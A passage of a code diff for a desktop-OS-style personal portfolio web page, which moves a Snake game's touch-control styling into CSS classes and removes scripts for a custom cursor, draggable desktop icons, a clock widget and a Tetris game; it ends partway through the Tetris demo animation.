+            <button onclick="snakeChangeUser()" class="game-btn-ghost" style="padding:7px 14px;">Change Player</button>
           </div>
         </div>
       </div>
 
       <!-- Mobile D-pad (always visible during game on mobile) -->
-      <div id="snakeDpadBottom" style="display:none;padding:8px;background:#0a0a0a;border-top:1px solid #1a1a1a;flex-shrink:0;">
-        <div style="display:grid;grid-template-columns:44px 44px 44px;grid-template-rows:44px 44px;gap:4px;margin:0 auto;width:fit-content;">
+      <div id="snakeDpadBottom" class="dpad-bottom">
+        <div class="dpad-grid-lg">
           <div></div>
-          <button ontouchstart="snakeMobileDir(0,-1)" onclick="snakeMobileDir(0,-1)" style="background:rgba(var(--accent-rgb),0.1);border:1px solid rgba(var(--accent-rgb),0.25);border-radius:8px;color:var(--accent);font-size:1.1rem;cursor:pointer;touch-action:manipulation;">▲</button>
+          <button ontouchstart="snakeMobileDir(0,-1)" onclick="snakeMobileDir(0,-1)" class="dpad-btn dpad-btn-lg" style="font-size:1.1rem;">▲</button>
           <div></div>
-          <button ontouchstart="snakeMobileDir(-1,0)" onclick="snakeMobileDir(-1,0)" style="background:rgba(var(--accent-rgb),0.1);border:1px solid rgba(var(--accent-rgb),0.25);border-radius:8px;color:var(--accent);font-size:1.1rem;cursor:pointer;touch-action:manipulation;">◀</button>
-          <button ontouchstart="snakeTogglePause()" onclick="snakeTogglePause()" style="background:rgba(var(--accent-rgb),0.1);border:1px solid rgba(var(--accent-rgb),0.25);border-radius:8px;color:var(--accent);font-size:0.6rem;cursor:pointer;touch-action:manipulation;letter-spacing:0;">II</button>
-          <button ontouchstart="snakeMobileDir(1,0)" onclick="snakeMobileDir(1,0)" style="background:rgba(var(--accent-rgb),0.1);border:1px solid rgba(var(--accent-rgb),0.25);border-radius:8px;color:var(--accent);font-size:1.1rem;cursor:pointer;touch-action:manipulation;">▶</button>
+          <button ontouchstart="snakeMobileDir(-1,0)" onclick="snakeMobileDir(-1,0)" class="dpad-btn dpad-btn-lg" style="font-size:1.1rem;">◀</button>
+          <button ontouchstart="snakeTogglePause()" onclick="snakeTogglePause()" class="dpad-btn dpad-btn-lg dpad-btn-p" style="font-size:0.6rem;">II</button>
+          <button ontouchstart="snakeMobileDir(1,0)" onclick="snakeMobileDir(1,0)" class="dpad-btn dpad-btn-lg" style="font-size:1.1rem;">▶</button>
           <div></div>
-          <button ontouchstart="snakeMobileDir(0,1)" onclick="snakeMobileDir(0,1)" style="background:rgba(var(--accent-rgb),0.1);border:1px solid rgba(var(--accent-rgb),0.25);border-radius:8px;color:var(--accent);font-size:1.1rem;cursor:pointer;touch-action:manipulation;">▼</button>
+          <button ontouchstart="snakeMobileDir(0,1)" onclick="snakeMobileDir(0,1)" class="dpad-btn dpad-btn-lg" style="font-size:1.1rem;">▼</button>
           <div></div>
         </div>
       </div>
     </div>
 
     <!-- RIGHT: Live leaderboard side panel -->
-    <div id="snakeSidePanel" style="display:none;width:160px;flex-shrink:0;border-left:1px solid #1a1a1a;display:flex;flex-direction:column;background:#050505;">
-      <div style="font-size:0.58rem;color:var(--muted);letter-spacing:0.12em;text-transform:uppercase;padding:10px 10px 6px;border-bottom:1px solid #111;">🏆 TOP 10</div>
-      <div id="snakeSideLbList" style="flex:1;overflow-y:auto;"></div>
+    <div id="snakeSidePanel" class="snake-side">
+      <div class="snake-side-title">🏆 TOP 10</div>
+      <div id="snakeSideLbList" class="snake-side-list"></div>
     </div>
 
   </div>
   <div class="win-resize" onmousedown="startResize(event,'win-snake')" ontouchstart="startResizeTouch(event,'win-snake')"></div>
 </div>
+
 <!-- Shutdown / Reboot Overlay -->
 <div id="shutdownOverlay" style="display:none;position:fixed;inset:0;background:#000;z-index:999999;flex-direction:column;align-items:center;justify-content:center;font-family:'Fira Code',monospace;">
   <div id="shutdownLog" style="width:560px;max-width:95vw;text-align:left;font-size:0.75rem;color:#00ff9d;line-height:1.9;"></div>
@@ -3453,1118 +935,25 @@ document.addEventListener('keydown', e => {
 
 
 <script>
-// ══════════════════════════════════════════════════════════════
-// CUSTOM CURSOR
-// ══════════════════════════════════════════════════════════════
-(function(){
-  var dot  = document.getElementById('customCursor');
-  var ring = document.getElementById('cursorRing');
-  var rx = 0, ry = 0; // ring lags behind
-  var mx = 0, my = 0;
-
-  document.addEventListener('mousemove', function(e){
-    mx = e.clientX; my = e.clientY;
-    dot.style.left  = mx + 'px';
-    dot.style.top   = my + 'px';
-  });
-
-  // Smooth ring follow
-  function animRing(){
-    rx += (mx - rx) * 0.18;
-    ry += (my - ry) * 0.18;
-    ring.style.left = rx + 'px';
-    ring.style.top  = ry + 'px';
-    requestAnimationFrame(animRing);
-  }
-  animRing();
-
-  // Click effect
-  document.addEventListener('mousedown', function(){ document.body.classList.add('cursor-click'); });
-  document.addEventListener('mouseup',   function(){ document.body.classList.remove('cursor-click'); });
-
-  // Hover effect on clickable elements
-  var hoverSel = 'a,button,.icon,.win-dot,.taskbar-start,.taskbar-task,.sm-item,.ctx-item,.project-card,.contact-item,.cert-item,.preset-btn';
-  document.addEventListener('mouseover', function(e){
-    if(e.target.closest(hoverSel)) document.body.classList.add('cursor-hover');
-  });
-  document.addEventListener('mouseout', function(e){
-    if(e.target.closest(hoverSel)) document.body.classList.remove('cursor-hover');
-  });
-
-  // Hide when leaving window
-  document.addEventListener('mouseleave', function(){ dot.style.opacity='0'; ring.style.opacity='0'; });
-  document.addEventListener('mouseenter', function(){ dot.style.opacity='1'; ring.style.opacity='1'; });
-
-  // Update cursor color when theme changes
-  var _orig = window.applyThemeColor;
-  if(_orig) window.applyThemeColor = function(hex){
-    _orig(hex);
-    var lines = dot.querySelectorAll('line,circle');
-    lines.forEach(function(el){ 
-      if(el.tagName==='line') el.setAttribute('stroke', hex);
-      else el.setAttribute('fill', hex);
-    });
-    ring.style.borderColor = hex.replace(')', ',0.6)').replace('rgb(','rgba(') || 'rgba(0,255,157,0.6)';
-  };
-})();
-
-// ══════════════════════════════════════════════════════════════
-// DESKTOP ICON GRID — snap grid, drag on desktop only, responsive
-// ══════════════════════════════════════════════════════════════
-(function(){
-  var STORE_KEY  = 'ankesh_icon_grid_v2';
-  var CELL_W     = 82;   // grid cell width
-  var CELL_H     = 86;   // grid cell height
-  var PAD        = 10;   // edge padding
-  var TASKBAR_H  = 44;
-
-  var grid  = document.getElementById('desktopIcons');
-  var icons = Array.from(grid.querySelectorAll('.icon'));
-
-  // ── MOBILE: leave CSS in charge, no JS positioning ──────────
-  function isMobile(){ return window.innerWidth <= 768; }
-
-  function resetMobile(){
-    grid.removeAttribute('style');
-    icons.forEach(function(ic){
-      ic.removeAttribute('style');
-    });
-  }
-
-  // ── DESKTOP: absolute canvas ─────────────────────────────────
-  function setupDesktop(){
-    grid.style.cssText = [
-      'position:fixed',
-      'top:0','right:0','bottom:0','left:0',
-      'width:100%','height:100%',
-      'display:block',
-      'pointer-events:none',
-      'overflow:visible',
-      'z-index:2'
-    ].join(';');
-
-    icons.forEach(function(ic){
-      ic.style.position = 'absolute';
-      ic.style.width    = CELL_W + 'px';
-      ic.style.margin   = '0';
-      ic.style.pointerEvents = 'all';
-    });
-  }
-
-  // ── GRID HELPERS ─────────────────────────────────────────────
-  // Returns {col, row} for a pixel position snapped to nearest cell
-  function pixelToCell(x, y){
-    var cols = availCols();
-    var rows = availRows();
-    var col  = Math.round(x / CELL_W);
-    var row  = Math.round(y / CELL_H);
-    col = Math.max(0, Math.min(cols - 1, col));
-    row = Math.max(0, Math.min(rows - 1, row));
-    return {col:col, row:row};
-  }
-
-  function cellToPixel(col, row){
-    // Default: right-aligned columns counted from right edge
-    var dw = window.innerWidth;
-    var x  = dw - PAD - CELL_W - col * CELL_W;
-    var y  = PAD + row * CELL_H;
-    return {x:x, y:y};
-  }
-
-  function availRows(){ return Math.max(1, Math.floor((window.innerHeight - TASKBAR_H - PAD * 2) / CELL_H)); }
-  function availCols(){ return Math.max(1, Math.floor((window.innerWidth  - PAD * 2) / CELL_W)); }
-
-  // Default grid cell for icon index i (right-side columns)
-  function defaultCell(i){
-    var rows = availRows();
-    var col  = Math.floor(i / rows);
-    var row  = i % rows;
-    return {col:col, row:row};
-  }
-
-  // ── SAVED POSITIONS ──────────────────────────────────────────
-  var saved = {};
-  try { saved = JSON.parse(localStorage.getItem(STORE_KEY) || '{}'); } catch(e){}
-
-  function saveCell(key, col, row){
-    try {
-      saved[key] = {col:col, row:row};
-      localStorage.setItem(STORE_KEY, JSON.stringify(saved));
-    } catch(e){}
-  }
-
-  function getKey(icon, i){
-    var t = icon.getAttribute('title') || ('icon'+i);
-    return 'ic_' + t.replace(/[^a-z0-9]/gi,'_').toLowerCase();
-  }
-
-  // ── POSITION ALL ICONS ───────────────────────────────────────
-  // occupiedCells tracks which {col,row} are taken to prevent overlap
-  function layoutIcons(keepSaved){
-    var occupied = {};  // "col_row" → true
-
-    icons.forEach(function(icon, i){
-      var key  = getKey(icon, i);
-      var cell;
-
-      if(keepSaved && saved[key]){
-        // Clamp to current screen size
-        var rows = availRows();
-        var cols = availCols();
-        cell = {
-          col: Math.min(saved[key].col, cols - 1),
-          row: Math.min(saved[key].row, rows - 1)
-        };
-        // If that cell is taken, find next free one
-        var cellKey = cell.col + '_' + cell.row;
-        if(occupied[cellKey]){ cell = nextFreeCell(occupied); }
-      } else {
-        // Use default column layout, skip occupied
-        cell = defaultCell(i);
-        var cellKey = cell.col + '_' + cell.row;
-        if(occupied[cellKey]){ cell = nextFreeCell(occupied); }
-      }
-
-      var ck = cell.col + '_' + cell.row;
-      occupied[ck] = true;
-
-      var px = cellToPixel(cell.col, cell.row);
-      icon.style.left = px.x + 'px';
-      icon.style.top  = px.y + 'px';
-      icon._gridCol = cell.col;
-      icon._gridRow = cell.row;
-    });
-  }
-
-  function nextFreeCell(occupied){
-    var rows = availRows();
-    var cols = availCols();
-    for(var c = 0; c < cols; c++){
-      for(var r = 0; r < rows; r++){
-        var ck = c + '_' + r;
-        if(!occupied[ck]) return {col:c, row:r};
-      }
-    }
-    return {col:0, row:0};
-  }
-
-  // ── DRAG ─────────────────────────────────────────────────────
-  function makeDraggable(icon, i){
-    var key = getKey(icon, i);
-    var dragging = false, moved = false;
-    var startX, startY, origLeft, origTop;
-
-    icon.addEventListener('mousedown', function(e){
-      if(e.button !== 0) return;
-      dragging = true; moved = false;
-      startX = e.clientX; startY = e.clientY;
-      origLeft = parseInt(icon.style.left) || 0;
-      origTop  = parseInt(icon.style.top)  || 0;
-      icon.style.zIndex    = '9999';
-      icon.style.opacity   = '0.85';
-      icon.style.transform = 'scale(1.1)';
-      icon.style.transition = 'none';
-      e.stopPropagation();
-    });
-
-    document.addEventListener('mousemove', function(e){
-      if(!dragging) return;
-      var dx = e.clientX - startX;
-      var dy = e.clientY - startY;
-      if(Math.abs(dx) > 4 || Math.abs(dy) > 4) moved = true;
-
-      var dw = window.innerWidth;
-      var dh = window.innerHeight - TASKBAR_H;
-      var nx = Math.max(PAD, Math.min(dw - CELL_W - PAD, origLeft + dx));
-      var ny = Math.max(PAD, Math.min(dh - CELL_H,       origTop  + dy));
-      icon.style.left = nx + 'px';
-      icon.style.top  = ny + 'px';
-    });
-
-    document.addEventListener('mouseup', function(e){
-      if(!dragging) return;
-      dragging = false;
-      icon.style.zIndex    = '';
-      icon.style.opacity   = '1';
-      icon.style.transform = '';
-      icon.style.transition = '';
-
-      if(moved){
-        // Snap to nearest free grid cell
-        var cx = parseInt(icon.style.left);
-        var cy = parseInt(icon.style.top);
-
-        // Convert pixel back to cell (relative to right edge)
-        var dw   = window.innerWidth;
-        var colFromRight = Math.round((dw - PAD - CELL_W - cx) / CELL_W);
-        var row  = Math.round((cy - PAD) / CELL_H);
-        var rows = availRows();
-        var cols = availCols();
-        colFromRight = Math.max(0, Math.min(cols - 1, colFromRight));
-        row = Math.max(0, Math.min(rows - 1, row));
-
-        // Check if that cell is occupied by another icon
-        var targetCell = {col: colFromRight, row: row};
-        var conflict = icons.find(function(ic2){
-          return ic2 !== icon && ic2._gridCol === targetCell.col && ic2._gridRow === targetCell.row;
-        });
-
-        if(conflict){
-          // Swap positions
-          var tempCol = icon._gridCol, tempRow = icon._gridRow;
-          conflict._gridCol = tempCol; conflict._gridRow = tempRow;
-          var conflictKey = getKey(conflict, icons.indexOf(conflict));
-          saveCell(conflictKey, tempCol, tempRow);
-          var cp = cellToPixel(tempCol, tempRow);
-          conflict.style.transition = 'left 0.2s, top 0.2s';
-          conflict.style.left = cp.x + 'px';
-          conflict.style.top  = cp.y + 'px';
-          setTimeout(function(){ conflict.style.transition=''; }, 220);
-        }
-
-        icon._gridCol = targetCell.col;
-        icon._gridRow = targetCell.row;
-        saveCell(key, targetCell.col, targetCell.row);
-
-        var sp = cellToPixel(targetCell.col, targetCell.row);
-        icon.style.transition = 'left 0.15s, top 0.15s';
-        icon.style.left = sp.x + 'px';
-        icon.style.top  = sp.y + 'px';
-        setTimeout(function(){ icon.style.transition=''; }, 160);
-
-        // Suppress accidental dblclick after drag
-        icon._suppress = true;
-        setTimeout(function(){ icon._suppress = false; }, 200);
-      }
-    });
-
-    icon.addEventListener('dblclick', function(e){
-      if(icon._suppress) e.stopImmediatePropagation();
-    });
-
-    // Right-click → reset to default cell
-    icon.addEventListener('contextmenu', function(e){
-      e.preventDefault(); e.stopPropagation();
-      delete saved[key];
-      try { localStorage.setItem(STORE_KEY, JSON.stringify(saved)); } catch(ex){}
-      layoutIcons(true);
-    });
-  }
-
-  // ── RESIZE: reflow icons that are now out of bounds ──────────
-  function onResize(){
-    if(isMobile()){ resetMobile(); return; }
-    setupDesktop();
-    layoutIcons(true); // keep saved cells but clamp to new screen
-  }
-
-  // ── INIT ─────────────────────────────────────────────────────
-  function init(){
-    if(isMobile()){ resetMobile(); return; }
-    setupDesktop();
-    layoutIcons(true);
-    icons.forEach(function(icon, i){ makeDraggable(icon, i); });
-  }
-
-  window.addEventListener('resize', onResize);
-  // Run after boot screen clears
-  document.addEventListener('DOMContentLoaded', function(){ setTimeout(init, 200); });
-
-})();
-</script>
-
-
-<script>
-// ════════════════════════════════════════════════════════════════
-// DESKTOP CLOCK WIDGET
-// ════════════════════════════════════════════════════════════════
-(function(){
-  function tickClock(){
-    var now  = new Date();
-    var h    = String(now.getHours()).padStart(2,'0');
-    var m    = String(now.getMinutes()).padStart(2,'0');
-    var s    = String(now.getSeconds()).padStart(2,'0');
-    var days = ['SUN','MON','TUE','WED','THU','FRI','SAT'];
-    var mons = ['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC'];
-    var dateStr = days[now.getDay()] + ', ' + mons[now.getMonth()] + ' ' +
-                  String(now.getDate()).padStart(2,'0') + ' ' + now.getFullYear();
-
-    var tEl = document.getElementById('deskClockTime');
-    var dEl = document.getElementById('deskClockDate');
-    var bar = document.getElementById('deskClockSecBar');
-    if(tEl) tEl.textContent = h + ':' + m + ':' + s;
-    if(dEl) dEl.textContent = dateStr;
-    if(bar) bar.style.width = ((now.getSeconds()/60)*100) + '%';
-  }
-  tickClock();
-  setInterval(tickClock, 1000);
-
-  // Keep clock color synced with theme
-  var _origApply = window.applyThemeColor;
-  window.applyThemeColor = function(hex){
-    if(_origApply) _origApply(hex);
-    var tEl = document.getElementById('deskClockTime');
-    var dEl = document.getElementById('deskClockDate');
-    var bar = document.getElementById('deskClockSecBar');
-    var bg  = document.getElementById('deskClockSec');
-    function hexToRgba(h,a){ var r=parseInt(h.slice(1,3),16),g=parseInt(h.slice(3,5),16),b=parseInt(h.slice(5,7),16); return 'rgba('+r+','+g+','+b+','+a+')'; }
-    if(tEl){ tEl.style.color = hexToRgba(hex,0.85); tEl.style.textShadow = '0 0 20px '+hexToRgba(hex,0.4)+',0 0 40px '+hexToRgba(hex,0.15); }
-    if(dEl) dEl.style.color = hexToRgba(hex,0.45);
-    if(bar) bar.style.background = hexToRgba(hex,0.5);
-    if(bg)  bg.style.background  = hexToRgba(hex,0.08);
-  };
-})();
-
-// ════════════════════════════════════════════════════════════════
-// TETRIS ENGINE
-// ════════════════════════════════════════════════════════════════
-(function(){
-  var COLS = 10, ROWS = 20, BLOCK = 26; // BLOCK recalculated in init()
-  var canvas, ctx, nextCvs, nextCtx;
-  var board, piece, nextPiece;
-  var score, level, lines, best;
-  var dropInterval, lastDrop, animId;
-  var state = 'idle'; // idle | playing | paused | over
-
-  var COLORS = {
-    I:'#00f5ff', O:'#febc2e', T:'#b06fff',
-    S:'#28c840', Z:'#ff3355', J:'#58a6ff', L:'#ff6d00'
-  };
-
-  var PIECES = {
-    I:[[0,0,0,0],[1,1,1,1],[0,0,0,0],[0,0,0,0]],
-    O:[[1,1],[1,1]],
-    T:[[0,1,0],[1,1,1],[0,0,0]],
-    S:[[0,1,1],[1,1,0],[0,0,0]],
-    Z:[[1,1,0],[0,1,1],[0,0,0]],
-    J:[[1,0,0],[1,1,1],[0,0,0]],
-    L:[[0,0,1],[1,1,1],[0,0,0]]
-  };
-
-  var PIECE_KEYS = Object.keys(PIECES);
-  var bag = [], bagNext = [];
-
-  function shuffleBag(arr){
-    for(var i=arr.length-1;i>0;i--){
-      var j=Math.floor(Math.random()*(i+1));
-      var t=arr[i]; arr[i]=arr[j]; arr[j]=t;
-    }
-    return arr;
-  }
-  function refillBag(b){ return shuffleBag(PIECE_KEYS.slice()); }
-
-  function nextFromBag(){
-    if(!bag.length) bag = refillBag();
-    return bag.pop();
-  }
-
-  function makePiece(type){
-    return {
-      type: type,
-      matrix: PIECES[type].map(function(r){ return r.slice(); }),
-      x: Math.floor(COLS/2) - Math.floor(PIECES[type][0].length/2),
-      y: 0,
-      color: COLORS[type]
-    };
-  }
-
-  function init(){
-    canvas  = document.getElementById('tetrisCanvas');
-    nextCvs = document.getElementById('tetrisNext');
-    if(!canvas || !nextCvs) return;
-    canvas.width  = COLS * BLOCK;
-    canvas.height = ROWS * BLOCK;
-    ctx     = canvas.getContext('2d');
-    nextCtx = nextCvs.getContext('2d');
-    best = 0;
-    try { best = parseInt(localStorage.getItem('tetris_best')||'0'); } catch(e){}
-    var b = document.getElementById('tetBest'); if(b) b.textContent = best;
-  }
-
-  function startGame(){
-    if(window.stopDemo) window.stopDemo();
-    board = Array.from({length:ROWS}, function(){ return new Array(COLS).fill(0); });
-    bag = refillBag();
-    score = 0; level = 1; lines = 0;
-    updateHUD();
-    piece     = makePiece(nextFromBag());
-    nextPiece = makePiece(nextFromBag());
-    state = 'playing';
-    hideOverlay();
-    var btn = document.getElementById('tetBtn'); if(btn) btn.textContent = '⏸ PAUSE';
-    var sb = document.getElementById('tetBtnSide'); if(sb){ sb.style.display='block'; sb.textContent='⏸ PAUSE'; }
-    lastDrop = performance.now();
-    if(animId) cancelAnimationFrame(animId);
-    gameLoop(lastDrop);
-
-    // Focus canvas for key events
-    canvas.setAttribute('tabindex','0');
-    canvas.focus();
-  }
-
-  function gameLoop(ts){
-    if(state !== 'playing'){ return; }
-    animId = requestAnimationFrame(gameLoop);
-    var interval = Math.max(80, 600 - (level-1)*55);
-    if(ts - lastDrop >= interval){
-      lastDrop = ts;
-      dropPiece();
-    }
-    draw();
-  }
-
-  function dropPiece(){
-    piece.y++;
-    if(collides(piece)){
-      piece.y--;
-      lock();
-    }
-  }
-
-  function hardDrop(){
-    while(!collides({matrix:piece.matrix, x:piece.x, y:piece.y+1})){
-      piece.y++;
-      score += 2;
-    }
-    lock();
-    updateHUD();
-  }
-
-  function lock(){
-    piece.matrix.forEach(function(row,r){
-      row.forEach(function(v,c){
-        if(v) board[piece.y+r][piece.x+c] = piece.color;
-      });
-    });
-    clearLines();
-    piece = nextPiece;
-    nextPiece = makePiece(nextFromBag());
-    if(collides(piece)){
-      gameOver();
-      return;
-    }
-    drawNext();
-  }
-
-  function clearLines(){
-    var cleared = 0;
-    for(var r=ROWS-1;r>=0;r--){
-      if(board[r].every(function(v){ return v!==0; })){
-        board.splice(r,1);
-        board.unshift(new Array(COLS).fill(0));
-        cleared++;
-        r++;
-      }
-    }
-    if(cleared){
-      var pts = [0,100,300,500,800][cleared] * level;
-      score += pts;
-      lines += cleared;
-      level = Math.floor(lines/10)+1;
-      updateHUD();
-      // Flash effect
-      flashLines();
-    }
-  }
-
-  function flashLines(){
-    ctx.fillStyle = 'rgba(0,255,157,0.18)';
-    ctx.fillRect(0,0,canvas.width,canvas.height);
-  }
-
-  function collides(p){
-    return p.matrix.some(function(row,r){
-      return row.some(function(v,c){
-        if(!v) return false;
-        var nx = p.x+c, ny = p.y+r;
-        return nx<0 || nx>=COLS || ny>=ROWS || (ny>=0 && board[ny][nx]!==0);
-      });
-    });
-  }
-
-  function rotate(p){
-    var m = p.matrix;
-    var N = m.length;
-    var rotated = Array.from({length:N}, function(_,r){
-      return Array.from({length:N}, function(_,c){ return m[N-1-c][r]; });
-    });
-    var kicked = {matrix:rotated, x:p.x, y:p.y, type:p.type, color:p.color};
-    // Wall kick
-    var kicks = [0,-1,1,-2,2];
-    for(var k=0;k<kicks.length;k++){
-      kicked.x = p.x + kicks[k];
-      if(!collides(kicked)){ p.matrix=rotated; p.x=kicked.x; return; }
-    }
-  }
-
-  function ghostRow(){
-    var gy = piece.y;
-    while(!collides({matrix:piece.matrix, x:piece.x, y:gy+1})) gy++;
-    return gy;
-  }
-
-  function draw(){
-    // Background
-    ctx.fillStyle = '#060a0d';
-    ctx.fillRect(0,0,canvas.width,canvas.height);
-
-    // Grid lines
-    ctx.strokeStyle = 'rgba(0,255,157,0.04)';
-    ctx.lineWidth = 0.5;
-    for(var c=0;c<=COLS;c++){ ctx.beginPath(); ctx.moveTo(c*BLOCK,0); ctx.lineTo(c*BLOCK,canvas.height); ctx.stroke(); }
-    for(var r=0;r<=ROWS;r++){ ctx.beginPath(); ctx.moveTo(0,r*BLOCK); ctx.lineTo(canvas.width,r*BLOCK); ctx.stroke(); }
-
-    // Board
-    board.forEach(function(row,r){
-      row.forEach(function(v,c){
-        if(v) drawBlock(ctx, c, r, v, 1);
-      });
-    });
-
-    // Ghost piece
-    var gy = ghostRow();
-    if(gy !== piece.y){
-      piece.matrix.forEach(function(row,r){
-        row.forEach(function(v,c){
-          if(v) drawBlock(ctx, piece.x+c, gy+r, piece.color, 0.18);
-        });
-      });
-    }
-
-    // Active piece
-    piece.matrix.forEach(function(row,r){
-      row.forEach(function(v,c){
-        if(v) drawBlock(ctx, piece.x+c, piece.y+r, piece.color, 1);
-      });
-    });
-  }
-
-  function drawBlock(c, x, y, color, alpha){
-    c.save();
-    c.globalAlpha = alpha;
-    // Fill
-    c.fillStyle = color;
-    c.fillRect(x*BLOCK+1, y*BLOCK+1, BLOCK-2, BLOCK-2);
-    // Shine
-    c.fillStyle = 'rgba(255,255,255,0.18)';
-    c.fillRect(x*BLOCK+2, y*BLOCK+2, BLOCK-4, 4);
-    // Glow border
-    if(alpha > 0.5){
-      c.shadowColor = color;
-      c.shadowBlur  = 6;
-      c.strokeStyle = color;
-      c.lineWidth   = 0.8;
-      c.strokeRect(x*BLOCK+1, y*BLOCK+1, BLOCK-2, BLOCK-2);
-    }
-    c.restore();
-  }
-
-  function drawNext(){
-    nextCtx.fillStyle = '#0a0d10';
-    nextCtx.fillRect(0,0,nextCvs.width,nextCvs.height);
-    if(!nextPiece) return;
-    var m   = nextPiece.matrix;
-    var bsz = 18;
-    var ox  = Math.floor((nextCvs.width  - m[0].length*bsz) / 2);
-    var oy  = Math.floor((nextCvs.height - m.length   *bsz) / 2);
-    m.forEach(function(row,r){
-      row.forEach(function(v,c){
-        if(v){
-          nextCtx.fillStyle = nextPiece.color;
-          nextCtx.shadowColor = nextPiece.color;
-          nextCtx.shadowBlur  = 5;
-          nextCtx.fillRect(ox+c*bsz+1, oy+r*bsz+1, bsz-2, bsz-2);
-        }
-      });
-    });
-  }
-
-  function drawIdleBoard(){
-    if(!ctx) return;
-    ctx.fillStyle = '#060a0d';
-    ctx.fillRect(0,0,COLS*BLOCK,ROWS*BLOCK);
-    ctx.strokeStyle = 'rgba(0,255,157,0.04)';
-    ctx.lineWidth = 0.5;
-    for(var c=0;c<=COLS;c++){ ctx.beginPath(); ctx.moveTo(c*BLOCK,0); ctx.lineTo(c*BLOCK,ROWS*BLOCK); ctx.stroke(); }
-    for(var r=0;r<=ROWS;r++){ ctx.beginPath(); ctx.moveTo(0,r*BLOCK); ctx.lineTo(COLS*BLOCK,r*BLOCK); ctx.stroke(); }
-  }
-
-  function updateHUD(){
-    document.getElementById('tetScore').textContent = score;
-    document.getElementById('tetLevel').textContent = level;
-    document.getElementById('tetLines').textContent = lines;
-    if(score > best){
-      best = score;
-      document.getElementById('tetBest').textContent = best;
-      try { localStorage.setItem('tetris_best', best); } catch(e){}
-    }
-  }
-
-  function showGameScreen(){
-    var idle = document.getElementById('tetIdleScreen');
-    var game = document.getElementById('tetGameScreen');
-    if(idle) idle.style.display = 'none';
-    if(game){ game.style.display = 'flex'; }
-  }
-
-  function showIdleScreen(){
-    var idle = document.getElementById('tetIdleScreen');
-    var game = document.getElementById('tetGameScreen');
-    if(game) game.style.display = 'none';
-    if(idle) idle.style.display = 'flex';
-    // Update best on idle screen too
-    var bi = document.getElementById('tetBestIdle');
-    if(bi) bi.textContent = best;
-    startDemo();
-  }
-
-  function gameOver(){
-    state = 'over';
-    cancelAnimationFrame(animId);
-    // Show pause/gameover overlay on top of game screen
-    var ov = document.getElementById('tetOverlay');
-    var title = document.getElementById('tetOverlayTitle');
-    var sub   = document.getElementById('tetOverlaySub');
-    if(title) title.textContent = 'GAME OVER';
-    if(sub)   sub.textContent   = 'Score: ' + score + '  ·  Best: ' + best;
-    if(ov)    ov.style.display  = 'flex';
-  }
-
-  function hideOverlay(){
-    var ov = document.getElementById('tetOverlay');
-    if(ov) ov.style.display = 'none';
-  }
-
-  function showPause(){
-    var ov    = document.getElementById('tetOverlay');
-    var title = document.getElementById('tetOverlayTitle');
-    var sub   = document.getElementById('tetOverlaySub');
-    if(title) title.textContent = 'PAUSED';
-    if(sub)   sub.textContent   = 'Press P to resume';
-    if(ov)    ov.style.display  = 'flex';
-  }
-
-  // Go back to main menu
-  window.tetrisBackToMenu = function(){
-    state = 'idle';
-    cancelAnimationFrame(animId);
-    hideOverlay();
-    showIdleScreen();
-  };
-
-  // Public start/pause/resume toggle
-  window.tetrisStartOrRestart = function(){
-    if(state === 'idle' || state === 'over'){
-      if(state === 'over') hideOverlay();
-      showGameScreen();
-      init();
-      startGame();
-    } else if(state === 'playing'){
-      state = 'paused';
-      cancelAnimationFrame(animId);
-      showPause();
-      var btn = document.getElementById('tetBtn');
-      if(btn) btn.textContent = '▶ RESUME';
-    } else if(state === 'paused'){
-      state = 'playing';
-      hideOverlay();
-      var btn = document.getElementById('tetBtn');
-      if(btn) btn.textContent = '⏸ PAUSE';
-      lastDrop = performance.now();
-      gameLoop(lastDrop);
-    }
-  };
-
-  // Keyboard controls — only when tetris window is focused/open
-  document.addEventListener('keydown', function(e){
-    var win = document.getElementById('win-tetris');
-    if(!win || win.style.display === 'none' || win.classList.contains('minimized')) return;
-    if(state !== 'playing') {
-      if(e.code === 'Space'){ e.preventDefault(); tetrisStartOrRestart(); }
-      return;
-    }
-    switch(e.code){
-      case 'ArrowLeft':  e.preventDefault(); piece.x--; if(collides(piece)) piece.x++; break;
-      case 'ArrowRight': e.preventDefault(); piece.x++; if(collides(piece)) piece.x--; break;
-      case 'ArrowDown':  e.preventDefault(); piece.y++; if(collides(piece)) piece.y--; score++; updateHUD(); break;
-      case 'ArrowUp':    e.preventDefault(); rotate(piece); break;
-      case 'Space':      e.preventDefault(); hardDrop(); break;
-      case 'KeyP':       e.preventDefault(); tetrisStartOrRestart(); break;
-    }
-    draw();
-  });
-
-  // tetrisInit called by openWindow in main script
-  window.tetrisInit = function(){
-    best = 0;
-    try { best = parseInt(localStorage.getItem('tetris_best')||'0'); } catch(e){}
-    var bi = document.getElementById('tetBestIdle');
-    if(bi) bi.textContent = best;
-    var b = document.getElementById('tetBest');
-    if(b) b.textContent = best;
-    showIdleScreen();
-  };
-
-  // ── DEMO ANIMATION — random pieces fall on idle screen ────────
-  var demoAnim = null;
-  var demoPieces = [];
-  var DEMO_COLS = ['#00f5ff','#00ff9d','#b06fff','#febc2e','#ff3355','#58a6ff','#ff6d00'];
-  var DEMO_SHAPES = [
-    [[1,1,1,1]],
-    [[1,1],[1,1]],
-    [[0,1,0],[1,1,1]],
-    [[0,1,1],[1,1,0]],
-    [[1,1,0],[0,1,1]],
-    [[1,0,0],[1,1,1]],
-    [[0,0,1],[1,1,1]]
-  ];
-
-  function startDemo(){
-    var dc = document.getElementById('tetDemoCanvas');
-    if(!dc) return;
-    var overlay = document.getElementById('tetOverlay');
-    if(!overlay) return;
-    dc.width  = overlay.offsetWidth  || 400;
-    dc.height = overlay.offsetHeight || 500;
-    var dctx = dc.getContext('2d');
-    var BSZ  = 22;
-    demoPieces = [];
-
-    // Spawn a piece at random column
-    function spawnDemo(){
-      var shape = DEMO_SHAPES[Math.floor(Math.random()*DEMO_SHAPES.length)];
-      var color = DEMO_COLS[Math.floor(Math.random()*DEMO_COLS.length)];
-      var maxX  = Math.max(0, dc.width - shape[0].length * BSZ);
-      demoPieces.push({
-        shape: shape, color: color,
-        x: Math.floor(Math.random() * (maxX / BSZ)) * BSZ,
-        y: -shape.length * BSZ,
-        speed: 0.6 + Math.random() * 1.2,
-        rot: 0, rotSpeed: (Math.random()-0.5)*0.02
-      });
-    }
-
-    // Spawn a few to start
-    for(var i=0;i<5;i++){
-      spawnDemo();
-      demoPieces[i].y = Math.random() * dc.height;
-    }
-
-    var spawnTimer = 0;
-    function demoLoop(){
-      if(state !== 'idle'){ return; }
-      demoAnim = requestAnimationFrame(demoLoop);
-
